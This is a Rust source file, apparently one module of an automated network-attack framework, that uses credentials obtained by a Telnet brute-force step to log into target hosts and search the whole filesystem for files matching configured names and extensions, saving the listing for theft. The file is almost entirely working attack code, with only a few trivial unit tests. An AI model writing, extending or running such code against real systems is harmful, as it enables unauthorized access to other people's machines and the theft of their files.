use std::sync::Arc;
use std::time::Duration;

use tokio::time::timeout;

use crate::actions::{Action, ActionOutcome, Target};
use crate::state::AppState;

use super::{build_output_dir, get_credentials};

/// Steal files from Telnet servers by executing remote commands.
/// Parent: TelnetBruteforce.
pub struct StealFilesTelnet;

impl Action for StealFilesTelnet {
    fn name(&self) -> &'static str {
        "StealFilesTelnet"
    }
    fn port(&self) -> Option<u16> {
        Some(23)
    }
    fn parent(&self) -> Option<&'static str> {
        Some("TelnetBruteforce")
    }

    fn execute<'a>(
        &'a self,
        target: &'a Target,
        state: &'a Arc<AppState>,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = ActionOutcome> + Send + 'a>> {
        Box::pin(run(target, state))
    }
}

async fn run(target: &Target, state: &Arc<AppState>) -> ActionOutcome {
    let creds = get_credentials(state, target.host_id, "telnet").await;
    if creds.is_empty() {
        return ActionOutcome::Failed("no credentials".to_string());
    }

    let config = state.config();
    let file_exts = &config.steal_file_extensions;
    let file_names = &config.steal_file_names;
    let local_dir = build_output_dir(state, "telnet", &target.mac_address, &target.ip);
    let _ = tokio::fs::create_dir_all(&local_dir).await;

    // Telnet file theft is unreliable — use sshpass as fallback if possible,
    // otherwise attempt to cat files through the telnet session.
    // For simplicity, we shell out to a helper script approach.
    for (user, password) in &creds {
        if state.shutdown.is_cancelled() {
            break;
        }

        // Build a find command pattern for matching files
        let mut find_args = Vec::new();
        for ext in file_exts {
            find_args.push(format!("-name '*{ext}'"));
        }
        for name in file_names {
            find_args.push(format!("-name '{name}'"));
        }
        let find_expr = find_args.join(" -o ");
        let find_cmd = format!("find / -type f \\( {find_expr} \\) 2>/dev/null");

        // Pipe login sequence through stdin to telnet — no shell interpolation.
        // This avoids command injection via user/password/ip values.
        use tokio::io::AsyncWriteExt;
        use tokio::process::Command as TokioCommand;

        let login_sequence = format!(
            "{user}\n{password}\n{find_cmd}\nexit\n",
            user = user,
            password = password,
            find_cmd = find_cmd,
        );

        let result = timeout(Duration::from_secs(60), async {
            let mut child = TokioCommand::new("telnet")
                .arg(&target.ip)
                .stdin(std::process::Stdio::piped())
                .stdout(std::process::Stdio::piped())
                .stderr(std::process::Stdio::null())
                .spawn()?;

            if let Some(mut stdin) = child.stdin.take() {
                // Small delays between writes to let telnet process prompts
                tokio::time::sleep(Duration::from_secs(1)).await;
                let _ = stdin.write_all(login_sequence.as_bytes()).await;
                let _ = stdin.flush().await;
                tokio::time::sleep(Duration::from_secs(3)).await;
                drop(stdin);
            }

            child.wait_with_output().await
        })
        .await;

        if let Ok(Ok(output)) = result {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let files: Vec<&str> = stdout
                .lines()
                .filter(|l| l.starts_with('/') && !l.contains("Login") && !l.contains("Escape"))
                .collect();

            if !files.is_empty() {
                tracing::info!(ip = %target.ip, files = files.len(), "found files via telnet");
                // Save file listing (actual download via telnet is limited)
                let listing_path = local_dir.join("file_listing.txt");
                let _ = tokio::fs::write(&listing_path, files.join("\n")).await;
                return ActionOutcome::Success;
            }
        }
    }

    ActionOutcome::Failed("no files found".to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn action_name() {
        let action = StealFilesTelnet;
        assert_eq!(action.name(), "StealFilesTelnet");
    }

    #[test]
    fn action_port() {
        let action = StealFilesTelnet;
        assert_eq!(action.port(), Some(23));
    }

    #[test]
    fn action_parent() {
        let action = StealFilesTelnet;
        assert_eq!(action.parent(), Some("TelnetBruteforce"));
    }
}
